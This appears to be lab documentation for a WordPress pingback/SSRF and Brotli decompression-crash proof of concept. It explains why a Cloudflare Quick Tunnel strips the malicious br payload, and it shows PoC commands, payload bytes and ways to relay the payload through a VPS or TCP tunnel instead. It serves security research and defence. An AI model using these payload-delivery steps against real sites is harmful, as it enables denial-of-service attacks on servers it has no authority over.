# Cloudflare Quick Tunnel (try.cloudflare.com)

The lab includes a `tunnel` Compose profile that publishes the payload server
with a **Cloudflare Quick Tunnel** (`https://<random>.trycloudflare.com`).
No account or DNS record is required.

This document also records an important lab result: **Cloudflare's edge
decodes the origin's `Content-Encoding: br` before forwarding the response,
so the malicious Brotli stream never reaches WordPress through a Quick
Tunnel.** The tunnel is still useful for testing the public-URL/SSRF path and
for demonstrating a CDN-level mitigation, but it is not a working delivery
path for the crash.

---

## Start the tunnel

```bash
make tunnel
```

This runs:

```bash
docker compose --profile tunnel up -d cloudflared
docker compose logs -f cloudflared
```

Look for:

```text
INF |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):
INF |  https://random-words-here.trycloudflare.com
```

Print it again later:

```bash
make tunnel-url
```

Test reachability:

```bash
curl -sS https://random-words-here.trycloudflare.com/health
# {"status": "ok", "hang_bytes": 86, "crash_bytes": 23068820, ...}
```

Only the payload server is published. The WordPress site stays on
`http://localhost:8080` and is never exposed by this tunnel.

---

## What actually happens through the tunnel

The origin sends:

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Encoding: br
Transfer-Encoding: chunked
```

Cloudflare terminates the encoding at the edge. The client receives the
**decoded** body, without `Content-Encoding: br`:

| Request | Origin bytes | Bytes received through Quick Tunnel |
|---|---:|---:|
| `GET /small.br` | 86 | **16,777,218** (16 MiB of `A`) |
| `GET /payload.br` | 23,068,820 | **0** |

The 86-byte stream is also a decompression bomb when decoded by a patched
decoder: it expands to 16 MiB of `A`. Cloudflare's patched edge handles it
and forwards the decoded bytes. The 23 MB stream decodes to zero bytes until
its tail, so the client gets an empty body.

This was tested with:

```bash
# Client advertises br, --raw disables client-side decoding.
curl --raw -H 'Accept-Encoding: br' \
  https://<random>.trycloudflare.com/small.br | wc -c
# 16777218

curl --raw -H 'Accept-Encoding: br' \
  -o /dev/null -w '%{size_download}\n' \
  https://<random>.trycloudflare.com/payload.br
# 0
```

Changing the response headers did **not** help:

* `Cache-Control: no-transform`
* `Content-Type: application/x-brotli`
* `Content-Disposition: attachment`
* `Accept-Encoding: br` from the client

Cloudflare decodes `br` from the origin in all of these cases. A Quick Tunnel
cannot deliver a byte-exact `br` body.

### Consequence for the PoC

If you use a tunnel URL as `--payload-url`, WordPress receives 16 MiB of `A`
or an empty body, **not** a Brotli stream. There is no `Content-Encoding: br`
for libcurl to decode and no vulnerable code path. The pingback returns a
fault (“A title on that page cannot be found” or “The source URL does not
exist”), not a crash.

```bash
# This is a reachability/SSRF demo, not a crash:
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --payload-url https://<random>.trycloudflare.com/small.br \
  --mode probe
```

Use the local attacker URL for the actual impact:

```bash
make hang     # http://attacker:8080/small.br
make crash    # http://attacker:8080/payload.br
```

---

## Why this is still useful

1. **Public-URL / SSRF path.** It proves that `wp_safe_remote_get()` will
   fetch an attacker-controlled public host when the host is not a private
   IP. The lab's mu-plugin is not involved.
2. **Egress testing.** You can see the outbound request in Cloudflare and
   attacker logs, and build detections for “WordPress fetched a fresh
   trycloudflare.com host”.
3. **A real compensating control.** A CDN or reverse proxy that terminates
   Brotli and re-encodes the body prevents the vulnerable decoder from
   seeing the attacker's bytes. This is a useful defence in depth — provided
   the proxy itself uses a patched Brotli library.
4. **A reminder that “the bytes on the wire” matter.** The same URL is
   harmless through Cloudflare and fatal on the Docker network. Threat
   models must include intermediaries that decode, buffer, or rewrite
   content.

If you need a public, byte-preserving relay, use one of the options below.

---

## Byte-preserving public options

### A VPS you control (recommended)

Run the payload server on a small VPS with a public IP and no CDN in front:

```bash
# On the VPS
python3 server.py   # PORT=8080, CHUNK_DELAY=1.0
```

Then use `http://<vps-ip>:8080/payload.br` as `--payload-url`. Verify that
the bytes survive:

```bash
curl --raw -H 'Accept-Encoding: br' \
  -o /tmp/check.br -w '%{size_download}\n' \
  http://<vps-ip>:8080/small.br
# 86

xxd /tmp/check.br | head -1
# 00000000: 2000 1041 4141 fcff ff07 0022 28f0  ....AAA....."(.
```

If the size is 86 and the first bytes are `20 00 10 41`, the path preserves
the stream.

### A raw TCP tunnel

A TCP tunnel that forwards bytes without HTTP content decoding (for example
`bore`, an SSH `-R` forward, or a WireGuard/Tailscale path) can also work.
Test it with the `curl --raw` command above before pointing the PoC at it.
Many “HTTP tunnels” behave like Cloudflare and decode or buffer the body.

### Do not use the tunnel for WordPress

Do not publish the WordPress site with a Quick Tunnel. The lab has
`admin/admin`, no TLS origin, and a deliberately vulnerable PHP stack. Keep
it local.

---

## Security notes

* Quick Tunnel URLs are public and ephemeral. Anyone with the URL can fetch
  the payload server.
* The tunnel is outbound-only; you do not open a router port.
* The URL changes when `cloudflared` restarts.
* Quick Tunnel has no SLA and is intended for testing.
* Stop it when finished:

```bash
docker compose --profile tunnel stop cloudflared
# or
docker compose --profile tunnel down
```

---

## How the Compose service is wired

```yaml
cloudflared:
  image: cloudflare/cloudflared:latest
  profiles: ["tunnel"]
  depends_on:
    attacker:
      condition: service_started
  command: tunnel --no-autoupdate --url http://attacker:8080
```

`cloudflared` resolves the `attacker` service on the Docker network and
connects to port 8080.

---

## Troubleshooting

### No URL in the logs

```bash
docker compose logs cloudflared | tail -50
```

Common causes: outbound TCP 443 blocked, broken DNS, or the attacker is not
healthy. Quick Tunnel needs outbound access to Cloudflare's edge.

### `curl .../health` returns 502

`cloudflared` is up but cannot reach `attacker:8080`:

```bash
docker compose ps
docker compose logs attacker
docker compose exec cloudflared wget -qO- http://attacker:8080/health
```

### The payload arrives as 16 MiB of `A` or 0 bytes

That is expected: Cloudflare decoded the origin's `Content-Encoding: br`.
Use the local URL or a byte-preserving relay.

### Cloudflare 524

Cloudflare's proxy timeout is 100 seconds, but WordPress gives up after 10
seconds. The 524 is not the limiting factor here.
